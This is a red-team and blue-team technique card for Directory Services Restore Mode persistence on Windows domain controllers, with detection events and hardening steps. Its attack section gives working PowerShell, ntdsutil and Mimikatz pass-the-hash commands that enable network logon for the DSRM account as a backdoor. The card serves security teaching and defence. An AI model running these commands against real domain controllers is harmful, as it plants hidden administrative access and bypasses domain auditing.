# [PE-VALID-006]: Directory Services Restore Mode (DSRM) Persistence

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-006 |
| **MITRE ATT&CK v18.1** | [Valid Accounts: Local Accounts (T1078.003)](https://attack.mitre.org/techniques/T1078/003/) |
| **Tactic** | Persistence / Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The DSRM Administrator account is a local administrator account on every Domain Controller. It is rarely used (only for disaster recovery) and its password is often set once during promotion and never changed. By default, it cannot login remotely. However, by changing the registry key `DsrmAdminLogonBehavior` to `2`, an attacker can allow the DSRM account to login via Network (Pass-the-Hash) while the DC is online. Since this is a local account, it bypasses AD password policies and auditing that targets domain accounts.
- **Attack Surface:** Registry on DC (`HKLM\System\CurrentControlSet\Control\Lsa\DSRM`).
- **Business Impact:** **Stealthy Persistence**. A backdoor that looks like a built-in recovery mechanism.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Domain Admin (to configure once).
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - PowerShell

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Enable Logon**
```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Force
```

**Step 2: Sync Password**
Sync DSRM password with a known domain account (optional).
```cmd
ntdsutil "set dsrm password" "sync from domain account Administrator" q q
```

**Step 3: Pass-the-Hash**
Login as `.\Administrator` (DSRM) using the hash.
```cmd
sekurlsa::pth /user:Administrator /domain:. /ntlm:HASH /run:cmd.exe
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Registry Audit
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 4657 | Registry Key Value Changed. Target: `DsrmAdminLogonBehavior`. |
| **Security** | 4624 | Logon. User: `Administrator`, Domain: `DC-NAME` (Local Logon on a DC is highly suspicious). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Rotate DSRM:** Regularly rotate the DSRM password on all DCs.
*   **Enforce Value:** Ensure `DsrmAdminLogonBehavior` is set to `0` or `1` via GPO Preference.

## 7. ATTACK CHAIN
> **Preceding Technique:** [PE-EXPLOIT-002]
> **Next Logical Step:** [CA-UNSC-001]
